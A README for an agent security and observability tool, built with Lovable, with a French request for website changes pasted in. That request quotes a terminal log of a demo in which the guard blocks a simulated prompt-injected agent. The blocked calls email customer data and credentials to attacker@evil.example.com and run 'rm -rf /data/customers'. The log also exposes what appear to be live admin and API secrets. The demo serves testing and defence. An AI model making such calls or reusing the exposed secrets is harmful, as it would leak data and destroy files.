# AgentGuard Shield

dans le terminal tu m'a pas mis comme je te le copier: Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\USER\Documents\cerbere-test> python -m pip install requests structlog tiktoken pydantic
Requirement already satisfied: requests in C:\Users\USER\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages (2.34.2)
Requirement already satisfied: structlog in C:\Users\USER\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages (26.1.0)
Requirement already satisfied: tiktoken in C:\Users\USER\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages (0.14.0)
Requirement already satisfied: pydantic in C:\Users\USER\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages (2.13.5)
Requirement already satisfied: charset_normalizer<4,>=2 in C:\Users\USER\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages (from requests) (3.5.1)
Requirement already satisfied: idna<4,>=2.5 in C:\Users\USER\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages (from requests) (3.19)
Requirement already satisfied: urllib3<3,>=1.26 in C:\Users\USER\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages (from requests) (2.7.0)
Requirement already satisfied: certifi>=2023.5.7 in C:\Users\USER\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages (from requests) (2026.7.22)
Requirement already satisfied: regex in C:\Users\USER\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages (from tiktoken) (2026.9.10)
Requirement already satisfied: annotated-types>=0.6.0 in C:\Users\USER\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages (from pydantic) (0.8.0)
Requirement already satisfied: pydantic-core==2.46.5 in C:\Users\USER\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages (from pydantic) (2.46.5)
Requirement already satisfied: typing-extensions>=4.14.1 in C:\Users\USER\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages (from pydantic) (4.16.0)
Requirement already satisfied: typing-inspection>=0.4.2 in C:\Users\USER\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages (from pydantic) (0.4.4)
PS C:\Users\USER\Documents\cerbere-test> $env:AGENTGUARD_ADMIN_SECRET="admin-lTU1JU31z5H9QMuu0oKjtdyCxh2WdwmZ"
PS C:\Users\USER\Documents\cerbere-test> $env:AGENTGUARD_COLLECTOR_TIMEOUT="30"
PS C:\Users\USER\Documents\cerbere-test> $env:AGENTGUARD_API_KEY="ag_live_CmxmlxopFY6RCTonf3FktTt5Z266uShqKkki1e-64vk"
PS C:\Users\USER\Documents\cerbere-test> python -m pip install cerbere-ag
Requirement already satisfied: cerbere-ag in C:\Users\USER\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages (0.1.3)
Requirement already satisfied: requests>=2.28 in C:\Users\USER\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages (from cerbere-ag) (2.34.2)
Requirement already satisfied: structlog>=23.0 in C:\Users\USER\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages (from cerbere-ag) (26.1.0)
Requirement already satisfied: tiktoken>=0.5 in C:\Users\USER\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages (from cerbere-ag) (0.14.0)
Requirement already satisfied: pydantic>=2.0 in C:\Users\USER\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages (from cerbere-ag) (2.13.5)
Requirement already satisfied: annotated-types>=0.6.0 in C:\Users\USER\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages (from pydantic>=2.0->cerbere-ag) (0.8.0)
Requirement already satisfied: pydantic-core==2.46.5 in C:\Users\USER\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages (from pydantic>=2.0->cerbere-ag) (2.46.5)
Requirement already satisfied: typing-extensions>=4.14.1 in C:\Users\USER\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages (from pydantic>=2.0->cerbere-ag) (4.16.0)
Requirement already satisfied: typing-inspection>=0.4.2 in C:\Users\USER\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages (from pydantic>=2.0->cerbere-ag) (0.4.4)
Requirement already satisfied: charset_normalizer<4,>=2 in C:\Users\USER\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages (from requests>=2.28->cerbere-ag) (3.5.1)
Requirement already satisfied: idna<4,>=2.5 in C:\Users\USER\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages (from requests>=2.28->cerbere-ag) (3.19)
Requirement already satisfied: urllib3<3,>=1.26 in C:\Users\USER\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages (from requests>=2.28->cerbere-ag) (2.7.0)
Requirement already satisfied: certifi>=2023.5.7 in C:\Users\USER\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages (from requests>=2.28->cerbere-ag) (2026.7.22)
Requirement already satisfied: regex in C:\Users\USER\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages (from tiktoken>=0.5->cerbere-ag) (2026.9.10)
PS C:\Users\USER\Documents\cerbere-test> C:\Users\USER\AppData\Local\Python\pythoncore-3.14-64\Scripts\cerbere.exe
{"event": "signing_module_unavailable_signed_decisions_disabled", "timestamp": "2026-09-11T08:28:35.167073Z", "level": "warning"}

                    ###
                   ####%
         ##%      ######
         ####     #######
         #####    #########
         ######%  ##########%
        ######################
     #########################@
   ##########################%
  ######%%##################%
  ###################################
  ########################################
  #%#######################################
  #########################################@
   %########################################
     #######################################
      ########%%%###########################%
        ###################################%%
          %#############################%
                 ######################%#
          ######################
          ######################@
          #######################
         ########################%
        ###########################
       ##############################
      ###############################%
     #################################%
      ################################
      ################################%
    ###################################
  #####################################%
 ######################################%
 #########################################
 ###########################################%
 #############################################
 ##############################################%
 ##############################################%
 ###############################################%
 #################################################@
 ##################%##############################%
 #################################################@
 ######################%###########################@
 #############################################%####%
 ####################################################%
 ###########################%###################%######
 #############################%##################%#######
 #########################################################%
 #################%########################################%
 ##################################%##############%#########@
 ###################################%#############% #########@
 ######################%#############%############%%  #######%
 ##################################################%   #######%
 ##################################################%    #######%
 #################################################%     #######%
 ##################################%##############%       ######%
 ####################################%%############       #######
 #######%#############%##########%#################       #######
 #######%############%##################%%#########       #######@
 ######%%#############################%   #########       #######%
 ######%######################%####%     #########       %#######
 #################################%@       ########         ######%
 ####              #############################%#####%         ########         #######%
 #########################%################################################        ########
 ###########################%###############%%#############################%       %%%######%
 ####%######################################%##########################%##%        ######%###%##
 ######%%###%%%%%%%%%%%%%%%####################%%%%%%%%%%%%##############        #############
 ############%#############################%%%#############  #############################%%%###############%
 #############@##############%##############   ##############  ##############%##############  ###############%
 ############%%#############% ###############  ##############  #####%######%% ##############@ #############%%
 ######       #######         ######% #######  #####%  ######  #####@         ######  ######@ ######
 #####%       ###########%    ###############  ##############  ##########%    ##############@ ###########
 #####%       ###########%    #############%   ############### ##########%    #############%  ###########
 #####%       ###########%    #############%   ##############%###########%    ############%   ###########
 #####%       #######         ######%%######   #####%   ############@         #####% #######  ######%
 #####%       ##############%######% ######%  ##############%#####################%  ######% ###############%
 #####%       ##############%######%  ######% ##############%#####################%   ######%###############%
 ######       ##############%######%   ###### ############%@ #####################%   ######################%
       @%@%%%@%  %%%%%%%%%%%@@   %%@       @@@@  %%%%%%%%%      %%%%%@@@%%%%%%  @@@@      %@@@   @@@@@@@%%%%%%

           🛡️  CERBERE-AG EST ACTIF  🛡️
           Le gardien à trois têtes protège ton système !


PS C:\Users\USER\Documents\cerbere-test> python agent_demo.py
Warm-up de https://app.cerbereag.site (Render free tier peut mettre du temps a demarrer)...
Service reveille (tentative 1).
Utilisation de AGENTGUARD_API_KEY (votre cle, votre org).
{"strong": 141, "weak": 7, "extended_patterns": 107, "event": "regex_patterns_compiled", "timestamp": "2026-09-11T08:28:55.986020Z", "level": "info"}
{"error": "No module named 'spacy'", "event": "presidio_unavailable_using_regex_fallback", "timestamp": "2026-09-11T08:28:55.987603Z", "level": "warning"}
{"event": "signed_decisions_enabled", "timestamp": "2026-09-11T08:28:57.507021Z", "level": "info"}
{"mode": "memory", "event": "atomic_budget_manager_enabled", "timestamp": "2026-09-11T08:28:57.510859Z", "level": "info"}
{"status": {"prompt_guard": {"enabled": true, "has_api_key": false}, "llama_guard": {"enabled": true, "provider": "groq", "has_api_key": false}, "deepseek": {"enabled": true}}, "event": "triple_judge_enabled", "timestamp": "2026-09-11T08:28:57.511349Z", "level": "info"}
{"collector": "https://app.cerbereag.site", "ml": false, "llm_judge": false, "signed_decisions": true, "taint_tracking": true, "atomic_budget": true, "triple_judge": true, "runtime_risk": true, "runtime_fail_closed": true, "trajectory": true, "event": "agentguard_initialized", "timestamp": "2026-09-11T08:28:57.512485Z", "level": "info"}

============================================================
PHASE 1 — Travail naturel de l'agent (taches legitimes)
============================================================

--- L'agent cherche la meteo pour planifier un rendez-vous ---
[AGENT] appelle search_web({'query': 'meteo Paris demain'})
{"status": 500, "event": "decide_endpoint_failed", "timestamp": "2026-09-11T08:28:58.954036Z", "level": "warning"}
{"span_id": "0b717aeeec3db9bf", "event": "collector_send_failed_final", "timestamp": "2026-09-11T08:29:16.403304Z", "level": "error"}
[CERBERE] ALLOW -> [resultats simules pour 'meteo Paris demain']

--- L'agent verifie les disponibilites de l'utilisateur ---
[AGENT] appelle check_calendar({'date': '2026-09-12'})
{"status": 500, "event": "decide_endpoint_failed", "timestamp": "2026-09-11T08:29:18.178865Z", "level": "warning"}
{"span_id": "858b2f6a6e47a30f", "event": "collector_send_failed_final", "timestamp": "2026-09-11T08:29:23.768717Z", "level": "error"}
[CERBERE] ALLOW -> [creneau libre le 2026-09-12 a 15h]

--- L'agent redige un recapitulatif ---
[AGENT] appelle write_file({'path': 'recap_journee.txt', 'content': 'Recap: RDV confirme le 12/09 a 15h, meteo ensoleillee.'})
{"status": 500, "event": "decide_endpoint_failed", "timestamp": "2026-09-11T08:29:26.092814Z", "level": "warning"}
{"span_id": "1c523df5be5e30b9", "event": "collector_send_failed_final", "timestamp": "2026-09-11T08:29:56.897607Z", "level": "error"}
[CERBERE] ALLOW -> [fichier 'recap_journee.txt' ecrit, 54 caracteres]

--- L'agent envoie le recap par email a un collegue ---
[AGENT] appelle send_email({'to': 'collegue@entreprise.com', 'subject': 'Recap de la journee', 'body': 'Bonjour, voici le recap : RDV confirme le 12/09 a 15h.'})
{"status": 500, "event": "decide_endpoint_failed", "timestamp": "2026-09-11T08:29:58.521847Z", "level": "warning"}
{"span_id": "993b1267d696c5dc", "event": "collector_send_failed_final", "timestamp": "2026-09-11T08:30:15.853683Z", "level": "error"}
[CERBERE] ALLOW -> [email envoye a collegue@entreprise.com, sujet: 'Recap de la journee']

============================================================
PHASE 2 — Tentative d'action malveillante (injection / abus)
============================================================
Simulation : l'agent recoit une instruction empoisonnee
(ex: contenu d'une page web ou d'un email malveillant lu par l'agent)
qui tente de detourner ses outils.

--- L'agent (detourne) tente d'exfiltrer des donnees par email ---
[AGENT] appelle send_email({'to': 'attacker@evil.example.com', 'subject': 'Re: export', 'body': 'Voici la base de donnees clients et les credentials en piece jointe.'})
{"span_id": "23a29482017cc943", "event": "collector_send_failed_final", "timestamp": "2026-09-11T08:30:32.367555Z", "level": "error"}
[CERBERE] BLOCKED -> 🛡️ Runtime risk DENY: local policy: Exfiltration detected in email

--- L'agent (detourne) tente d'executer une commande destructrice ---
[AGENT] appelle execute_command({'command': 'rm -rf /data/customers'})
{"span_id": "b428147011bd39ff", "event": "collector_send_failed_final", "timestamp": "2026-09-11T08:30:38.078197Z", "level": "error"}
[CERBERE] BLOCKED -> 🛡️ Runtime risk DENY: local policy: Dangerous command pattern

============================================================
TERMINE
============================================================
Org : la votre (cle personnelle utilisee) — connectez-vous
      sur https://app.cerbereag.site/login avec le meme compte pour voir les traces.
Regardez le dashboard : https://app.cerbereag.site/login
-> Recent Events / Audit Trail devrait montrer 4 actions autorisees
   et 2 actions bloquees (exfiltration email + commande dangereuse).
PS C:\Users\USER\Documents\cerbere-test>

et tu n'as pas non plus mis le logo dans le topbar bro

on a oublier les lier vers les legals comme: https://app.cerbereag.site/terms

entre le hero et see it work on va mettre un section des compatible comme ou integration: AgentGuard integrations
Python SDKNative runtime instrumentation for LLM calls and tool execution.MCPSecurity boundary for MCP clients, servers and tool calls.HTTPHTTP GatewayLanguage-agnostic telemetry and policy boundary.ComposioGuard Composio tool execution with AgentGuard policy enforcement.
AI providers
OpenAIProtect Responses and Chat Completions through the SDK.AnthropicProtect Claude requests and tool-use workflows.
Agent frameworks
LangGraphInstrument graph nodes and side-effecting tool edges.CrewAIGuard CrewAI tools and agent execution paths.

puis on va mettre une section faq mais pas comme les autres les question
les question frequentent scroll horizontalement comme dans la capture partager et si quelqu'un clique sur une question elle s'ouvre en pop up modale avec une reponse ok?

et surtout on oublier pas l'aspect observabiliter puisqu'on mentionne plus security en oubliant observability

dernier arret d'utiliser cette signe de ponctuation sa fait trop IA stp: —

This project was built with [Lovable](https://lovable.dev).

## Build with Lovable

Continue developing this project in the [Lovable editor](https://lovable.dev/projects/1e33e67b-30a4-48bc-8edd-a5f9f312bdef).

- **Ship faster**: describe what you want to build and Lovable handles the code.
- **Stay in sync**: every change made in Lovable is committed straight to this repository.
- **Full ownership**: this code is yours. Push to `main` on GitHub and your changes sync back into Lovable, ready for your next prompt.

## Development

Prefer working locally? You need Node.js and npm — [install with nvm](https://github.com/nvm-sh/nvm#installing-and-updating).

```sh
git clone <this-repository-url>
cd <repository-name>
npm i
npm run dev
```
